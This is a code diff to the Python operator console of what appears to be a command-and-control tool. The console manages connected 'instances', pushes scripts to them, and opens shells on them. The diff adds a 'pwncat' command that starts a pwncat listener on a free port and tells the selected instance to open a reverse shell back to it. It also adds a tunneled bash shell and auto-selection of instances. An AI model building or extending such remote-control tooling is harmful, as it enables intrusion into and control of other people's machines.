@@ -1,16 +1,18 @@
 import my_logging
 from typing import Callable, Optional
-from prompt_toolkit import Application, PromptSession
+from prompt_toolkit import PromptSession
 from prompt_toolkit.validation import DynamicValidator, Validator
 from prompt_toolkit.completion import NestedCompleter, DynamicCompleter
 from prompt_toolkit.patch_stdout import patch_stdout
 import os
+import subprocess
 
 import stager
 from instance import Instance
 from instance_manager import InstanceManager
 import web_server
 from pyterpreter import Message
+from port_manager import PortManager
 
 logger = my_logging.Logger('APP')
 
@@ -23,7 +25,7 @@ class App():
     selected_instance: Optional[Instance] = None
 
     def __init__(self):
-        InstanceManager.on_instances_update = self._list_instances
+        InstanceManager.on_instances_update = self._on_instances_update
         with patch_stdout(raw=True):
             session = PromptSession()
             while True:
@@ -42,18 +44,31 @@ class App():
 
     def get_callable_from_command(self, command: str) -> Optional[Callable]:
         try:
+            args = []
             command_parts = command.split(' ')
             item = self.completions_with_functions
             for i in range(len(command_parts)):
                 command_part = command_parts[i]
-                item = item[command_part]
+                try:
+                    int(command_part)
+                    item = item['INT']
+                    args.append(int(command_part))
+                except ValueError or KeyError:
+                    item = item[command_part]
                 if callable(item):
-                    return item
+                    return get_lambda(item, *args)
         except KeyError:
             pass
 
     @property
     def completions_with_functions(self):
+        instance_commands = {
+            'pwncat': self._do_pwncat,
+            'run_script': {
+                script: get_lambda(self._do_run_script, script) for script in map(lambda path: os.path.split(path)[-1], web_server.get_available_scripts())
+            },
+            'shell': self._do_open_shell_bash
+        }
         global_commands = {
             'show': {
                 'instances': self._list_instances
@@ -64,12 +79,6 @@ class App():
                 }
             },
 
-        }
-        instance_commands = {
-            'run_script': {
-                script: get_lambda(self._do_run_script, script) for script in map(lambda path: os.path.split(path)[-1], web_server.get_available_scripts())
-            },
-            'shell': self._do_open_shell
         }
         return {**global_commands, **instance_commands} if self.selected_instance is not None and self.selected_instance.active else global_commands
 
@@ -101,8 +110,21 @@ class App():
     def _do_run_script(self, script):
         InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.RUN_SCRIPT, script)))
 
-    def _do_open_shell(self):
-        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.OPEN_SHELL)))
+    def _do_open_shell_bash(self):
+        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.OPEN_SHELL_TUNNELED)))
+
+    def _do_pwncat(self):
+        port = PortManager.get_open_port()
+        subprocess.Popen(['tmux', 'new-window', '-n', f'pc:{self.selected_instance.username}', f'pwncat -lp {port}'], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        InstanceManager.messages_to_send.put((self.selected_instance, Message(Message.OPEN_SHELL_CLASSIC, str(port))))
+
+    def _on_instances_update(self):
+        instances = InstanceManager.get_all()
+        if self.selected_instance not in instances:
+            self.selected_instance = None
+        if self.selected_instance is None and len(instances) > 0:
+            self.selected_instance = instances[0]
+        self._list_instances()
 
     def _list_instances(self):
         for instance in InstanceManager.get_all():
